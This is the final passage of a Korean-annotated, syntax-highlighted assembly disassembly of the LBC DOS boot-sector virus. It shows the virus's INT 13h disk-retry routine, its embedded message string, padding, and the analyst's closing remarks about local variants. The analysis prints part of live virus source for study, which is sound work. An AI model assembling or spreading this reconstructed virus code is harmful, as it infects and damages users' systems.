                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_INT13O</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; 원래의 INT 13h 호출</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">NO_ERROR</span><span class="sc0">                </span><span class="sc1">; 에러 검사</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">; 에러 발생시 디스크 리세트</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; 인터럽트 리턴을 위한 스택 조정</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_INT13O</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; 원래의 INT 13h 호출</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; 재시도 횟수 복구</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">RETRY</span><span class="sc0">                   </span><span class="sc1">; 재시도</span><span class="sc0">

                </span><span class="sc6">STC</span><span class="sc0">                             </span><span class="sc1">; 에러 선언을 위한 캐리 세트</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">RETURN</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">NO_ERROR</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; 스택 조정</span><span class="sc0">
</span><span class="sc5">RETURN</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">RET</span><span class="sc0">                       </span><span class="sc1">; 상주된 바이러스 프로그램으로 복귀</span><span class="sc0">



                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">' virse program   messge Njh to Lbc '</span><span class="sc0">
</span><span class="sc1">; virus program message Njh to Lbc</span><span class="sc0">
</span><span class="sc1">; 를 잘못 적은것 같다. 제작자는 아마도 나이 어린 학생인것 같다.</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">166</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">        </span><span class="sc9">ENDS</span><span class="sc0">
        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">START</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 국내에는 LBC 바이러스를 변형한 바이러스들이 많다.</span><span class="sc0">
</span><span class="sc1">; 다음 기회에 플로피 전용(?)의 LBC 바이러스를 어떻게 변형 했는지</span><span class="sc0">
</span><span class="sc1">; 변형 바이러스를 가지고 분석해 보겠다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span></div></body>
</html>
